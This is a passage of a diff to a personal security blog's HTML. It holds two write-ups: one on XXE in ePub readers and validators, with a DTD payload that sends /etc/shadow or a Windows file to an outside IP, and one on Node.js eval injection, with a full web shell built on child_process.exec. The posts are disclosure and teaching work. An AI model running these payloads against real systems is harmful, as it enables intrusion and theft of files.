-<span class="cp">&lt;!ENTITY % c &quot;&lt;!ENTITY send SYSTEM &#39;ftp://123.123.123.123/%d;&#39;&gt;</span>&quot;&gt;</code></pre></div>
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % d SYSTEM "file:///etc/shadow"&gt;</span>
+<span class="cp">&lt;!ENTITY % c "&lt;!ENTITY send SYSTEM 'ftp://123.123.123.123/%d;'&gt;</span>"&gt;</code></pre></figure>
 
-<p><strong>EpubCheck &lt;= 4.0.1</strong> </p>
+<p><strong>EpubCheck &lt;= 4.0.1</strong></p>
 
-<p>There was a online instance of EpubCheck, that would accept user uploads and perform validation on the format. This provides an example of how this vulnerability could be used to attack online services that support ePub in some way, if they are using a vulnerable version of EpubCheck to validate the uploaded file. </p>
+<p>There was a online instance of EpubCheck, that would accept user uploads and perform validation on the format. This provides an example of how this vulnerability could be used to attack online services that support ePub in some way, if they are using a vulnerable version of EpubCheck to validate the uploaded file.</p>
 
 <p>Uploading our created file:
 <img src="/assets/epub/upload.png" alt="Image" /></p>
@@ -324,8 +332,8 @@
 
 <p>External DTD specifying the file to retrive:</p>
 
-<div class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % d SYSTEM &quot;file:///c:/Users/Documents/secret.txt&quot;&gt;</span>
-<span class="cp">&lt;!ENTITY % c &quot;&lt;!ENTITY send SYSTEM &#39;http://123.123.123.123/exfil/%d;&#39;&gt;</span>&quot;&gt;</code></pre></div>
+<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % d SYSTEM "file:///c:/Users/Documents/secret.txt"&gt;</span>
+<span class="cp">&lt;!ENTITY % c "&lt;!ENTITY send SYSTEM 'http://123.123.123.123/exfil/%d;'&gt;</span>"&gt;</code></pre></figure>
 
 <p>eg., Retrieving secret stuff from a users Windows documents folder:
 <img src="/assets/epub/ADE.png" alt="Image" /></p>
@@ -335,7 +343,7 @@
 
 <p><strong><a href="https://play.google.com/books/uploads">Google Play Book uploads</a></strong> did not allow external entity processing, but was vulnerable to XML exponential entity expansion <a href="https://cwe.mitre.org/data/definitions/776.html">billion laughs</a>. When uploading a ePub with this pattern, it would spend about 45 minutes trying to process the file before returning an error condition. Google confirmed this on their side.</p>
 
-<p>There are more things going on with the ePub format beyond the familiar patterns shown here. Some applications will allow Flash to be run, and Javascript execution in the context of the book reader, so you can imagine this can be used to perform some attacks; currently waiting on vendor fixes before talking about this. </p>
+<p>There are more things going on with the ePub format beyond the familiar patterns shown here. Some applications will allow Flash to be run, and Javascript execution in the context of the book reader, so you can imagine this can be used to perform some attacks; currently waiting on vendor fixes before talking about this.</p>
 
 <p>Disclosure timeline stuff:</p>
 
@@ -351,9 +359,9 @@
 
 <p>Thanks to <a href="http://www.cert.org/">CERT/CC</a> for their help in coordinating with different vendors &amp; IDPF, and setting a disclosure timeline. I only tested a handful of digital readers and services, so if you find other vulnerable readers/services, tell CERT/CC (they were tracking the ePubCheck issue as VU#779243).</p>
 
-<p>If you got this far, thanks for reading. 👋 </p>
+<p>If you got this far, thanks for reading. 👋</p>
 
-<p><a href="https://twitter.com/craig_arendt">@craig</a></p>
+<p><a href="https://twitter.com/signalchaos">@craig</a></p>
 
 
         </article>
@@ -369,7 +377,7 @@
 
 <!-- adding all articles to the front page for now. This will need to be changed later. -->
 	<article class="post-content">
-          <p>I’ve recently become interested in real world examples of vulnerabilities in Node.js applications, which allow <code>Server Side Javascript Injection</code>. One advisory I came across was <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7205">CVE-2014-7205</a> discovered by Jarda Kotěšovec in a <a href="https://github.com/hapijs/bassmaster/commit/b751602d8cb7194ee62a61e085069679525138c4">Basmaster plugin</a> which allows arbitrary Javascript injection.</p>
+          <p>I’ve recently become interested in real world examples of vulnerabilities in Node.js applications, which allow <code class="highlighter-rouge">Server Side Javascript Injection</code>. One advisory I came across was <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7205">CVE-2014-7205</a> discovered by Jarda Kotěšovec in a <a href="https://github.com/hapijs/bassmaster/commit/b751602d8cb7194ee62a61e085069679525138c4">Basmaster plugin</a> which allows arbitrary Javascript injection.</p>
 
 <p>I decided to mock up a simple example of user input passed to an eval() execution sink, to demonstrate an injection of a simple web shell into the server. This web shell will only exist within the current node.js process, and will not be written to disk.</p>
 
@@ -378,54 +386,54 @@
 
 <p>Vulnerable code (user input passed to an eval execution sink):</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/demo1&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kd">var</span> <span class="nx">year</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="s2">&quot;year = (&quot;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">year</span> <span class="o">+</span> <span class="s2">&quot;)&quot;</span><span class="p">);</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/demo1'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">year</span> <span class="o">=</span> <span class="kr">eval</span><span class="p">(</span><span class="s2">"year = ("</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">year</span> <span class="o">+</span> <span class="s2">")"</span><span class="p">);</span>
   <span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
 
   <span class="kd">var</span> <span class="nx">futureAge</span> <span class="o">=</span> <span class="mi">2050</span> <span class="o">-</span> <span class="nx">year</span><span class="p">;</span>
 
-  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;demo1&#39;</span><span class="p">,</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">'demo1'</span><span class="p">,</span>
     <span class="p">{</span>
-      <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Future Age&#39;</span><span class="p">,</span>
-      <span class="nx">output</span><span class="o">:</span> <span class="nx">futureAge</span>
+      <span class="na">title</span><span class="p">:</span> <span class="s1">'Future Age'</span><span class="p">,</span>
+      <span class="na">output</span><span class="p">:</span> <span class="nx">futureAge</span>
     <span class="p">});</span>
-<span class="p">});</span></code></pre></div>
+<span class="p">});</span></code></pre></figure>
 
 <p>In this example res.write(‘SSJS Injection’) is injected, and the server will return that string in the page response:
 <img src="/assets/SSJS_ws2.png" alt="Demo app" /></p>
 
 <p>So we can perform arbitrary SSJS injection on this location. What about injecting a web shell that will start up after 5 seconds, listening on TCP/8000?</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-    <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">require</span><span class="p">(</span><span class="s1">'http'</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
         <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span>
-            <span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span> <span class="s2">&quot;text/plain&quot;</span>
+            <span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"text/plain"</span>
         <span class="p">});</span>
-        <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">st</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">'url'</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">st</span><span class="p">)</span> <span class="p">{</span>
             <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
         <span class="p">});</span>
     <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
-<span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></div>
+<span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></figure>
 
 <p>One line web shell:</p>
 
-<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;Content-Type&quot;</span><span class="o">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">});</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">st</span><span class="p">)</span> <span class="p">{</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);});</span> <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'http'</span><span class="p">).</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span> <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"text/plain"</span><span class="p">});</span><span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nx">exec</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">'url'</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">).</span><span class="nx">query</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="nx">s</span><span class="p">,</span><span class="nx">st</span><span class="p">)</span> <span class="p">{</span><span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="nx">s</span><span class="p">);});</span> <span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span> <span class="p">},</span> <span class="mi">5000</span><span class="p">)</span></code></pre></figure>
 
-<p>Because we are inserting code which will be eval’d by the application, the web shell will not be written to disk, and execution will be performed from the existing node process. </p>
+<p>Because we are inserting code which will be eval’d by the application, the web shell will not be written to disk, and execution will be performed from the existing node process.</p>
 
 <p>Injection of the web shell (application continues to respond normally):
 <img src="/assets/SSJS_ws3.png" alt="Demo app" /></p>
 
-<p>Execution of <code>cat /etc/passwd</code> using the web shell:
+<p>Execution of <code class="highlighter-rouge">cat /etc/passwd</code> using the web shell:
 <img src="/assets/SSJS_ws4.png" alt="Demo app" /></p>
 
-<p>Execution of <code>ls -la /etc</code>:
+<p>Execution of <code class="highlighter-rouge">ls -la /etc</code>:
 <img src="/assets/SSJS_ws5.png" alt="Demo app" /></p>
 
 <p>This is a really simple example of an application with a SSJS injection vulnerability. Another thing to note is that tools to identify web application vulnerabilities may not have support to detect this vulnerability. At the time of this writing, Burp Suite v1.6.10 did not identify a SSJS injection vulnerability in the demo application.</p>
 
 <ul>
-  <li><code>s1gnalCha0s</code></li>
+  <li><a href="https://craigarendt.com">s1gnalCha0s</a></li>
 </ul>
 
         </article>
@@ -461,7 +469,7 @@
 
           
           <li>
-            <a href="https://twitter.com/craig_arendt">
+            <a href="https://twitter.com/signalchaos">
               <span class="icon  icon--twitter">
                 <svg viewBox="0 0 16 16">
                   <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809
@@ -469,7 +477,7 @@
                 </svg>
               </span>
 
-              <span class="username">craig_arendt</span>
+              <span class="username">signalchaos</span>
             </a>
           </li>
           
